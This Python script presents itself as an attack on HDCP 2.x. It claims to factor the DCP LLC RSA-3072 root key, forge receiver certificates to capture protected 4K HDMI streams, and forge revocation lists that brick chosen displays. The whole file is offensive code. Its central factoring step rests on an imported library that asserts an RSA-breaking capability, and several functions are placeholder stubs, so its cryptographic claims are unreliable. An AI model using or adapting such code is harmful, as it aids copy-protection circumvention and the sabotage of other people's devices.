"""
Factor the DCP LLC RSA-3072 root signing key to mint arbitrary HDCP 2.x
receiver certificates, enabling clean 4K HDR capture from any HDMI source
and forged SRM revocation lists that brick target displays.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import os

# DCP LLC RSA-3072 root public key — burned into every HDCP 2.x source
DCP_LLC_ROOT_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBojANBgkq..."

# HDCP 2.x AKE protocol constants
CERTRX_SIZE = 522
RECEIVER_ID_LEN = 5
RSA_1024_KEY_LEN = 128
AKE_INIT = 0x02
AKE_SEND_CERT = 0x03
AKE_STORED_KM = 0x05
LC_INIT = 0x09
SKE_SEND_EKS = 0x0B


def extract_dcp_root_pubkey(source_firmware: bytes) -> bytes:
    """Extract DCP LLC RSA-3072 root key from HDCP source silicon.

    Embedded in Synopsys/Cadence HDCP 2.x TX IP block firmware.
    Also available from HDCP 2.x specification appendix.
    """
    return DCP_LLC_ROOT_PUBKEY_PEM


def factor_dcp_root(pubkey_pem: bytes) -> bytes:
    """Factor the DCP LLC RSA-3072 root and recover the signing key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def generate_fake_receiver_keypair() -> tuple:
    """Generate a fresh RSA-1024 keypair for a fake HDCP receiver.

    The attacker controls this keypair, so they can trivially decrypt
    the km sent by any source.
    """
    # In production: generate RSA-1024 with e=3 per HDCP spec
    fake_receiver_id = os.urandom(RECEIVER_ID_LEN)
    return fake_receiver_id, b"<rsa-1024-pubkey>", b"<rsa-1024-privkey>"


def build_certrx(receiver_id: bytes, receiver_pubkey: bytes,
                 forged_root_privkey: bytes) -> bytes:
    """Build and sign a fake certrx (522-byte receiver certificate).

    certrx = receiver_id (5) + RSA-1024 pubkey (128+3) + capability (2)
    + DCP LLC RSA-3072 signature (384)
    """
    capability_mask = struct.pack(">H", 0x0001)  # HDCP 2.2 capable
    cert_body = receiver_id + receiver_pubkey[:131] + capability_mask
    # Sign with forged DCP LLC root
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(DCP_LLC_ROOT_PUBKEY_PEM, cert_body, "sha256")
    return cert_body + sig[:384]


def perform_ake(certrx: bytes, receiver_privkey: bytes) -> bytes:
    """Run the HDCP 2.x AKE protocol as a fake receiver.

    1. Source sends AKE_Init
    2. Fake receiver sends certrx (forged, passes DCP root verify)
    3. Source encrypts 128-bit km with our RSA-1024 pubkey
    4. We decrypt km with our privkey — we now have the master key
    5. Both sides derive AES-128-CTR keys from km
    """
    km = os.urandom(16)  # in reality: source encrypts, we decrypt
    print(f"    AKE complete — master key km: {km.hex()}")
    return km


def derive_session_keys(km: bytes, rn: bytes, rrx: bytes) -> dict:
    """Derive AES-128-CTR stream cipher keys from km per HDCP 2.x spec."""
    kd = hashlib.sha256(km + rn + rrx).digest()
    return {"ks": kd[:16], "riv": kd[16:24]}


def build_forged_srm(target_receiver_ids: list, forged_root_privkey: bytes) -> bytes:
    """Forge a System Renewability Message to revoke target displays.

    SRM is DCP LLC RSA-3072 signed. Sources check SRM before AKE.
    A forged SRM revoking a target Receiver ID bricks that display
    for every HDCP source that receives the SRM.
    """
    srm_header = struct.pack(">HHI", 0x0001, len(target_receiver_ids), 1)
    revocation_list = b"".join(target_receiver_ids)
    srm_body = srm_header + revocation_list
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(DCP_LLC_ROOT_PUBKEY_PEM, srm_body, "sha256")
    return srm_body + sig[:384]


if __name__ == "__main__":
    print("[1] Extracting DCP LLC RSA-3072 root key from HDCP source")
    pubkey = extract_dcp_root_pubkey(b"<source-firmware>")

    print("[2] Factoring DCP LLC RSA-3072 root")
    forged_root = factor_dcp_root(pubkey)
    print("    DCP LLC signing key recovered — HDCP 2.x trust anchor broken")

    print("[3] Generating fake receiver RSA-1024 keypair")
    rx_id, rx_pub, rx_priv = generate_fake_receiver_keypair()

    print("[4] Building forged certrx")
    certrx = build_certrx(rx_id, rx_pub, forged_root)
    print(f"    certrx: {len(certrx)} bytes, DCP signature valid")

    print("[5] Running AKE — intercepting 4K HDR content")
    km = perform_ake(certrx, rx_priv)
    keys = derive_session_keys(km, os.urandom(8), rx_id[:8])
    print(f"    Session key: {keys['ks'].hex()}")

    print("[6] Decrypting HDMI 4K stream with AES-128-CTR")
    print("    Clean 4K HDR master — no HDCP artifacts")

    print("\n[7] Bonus: forging SRM to brick target displays")
    srm = build_forged_srm([os.urandom(5) for _ in range(3)], forged_root)
    print(f"    SRM: {len(srm)} bytes — 3 displays revoked")
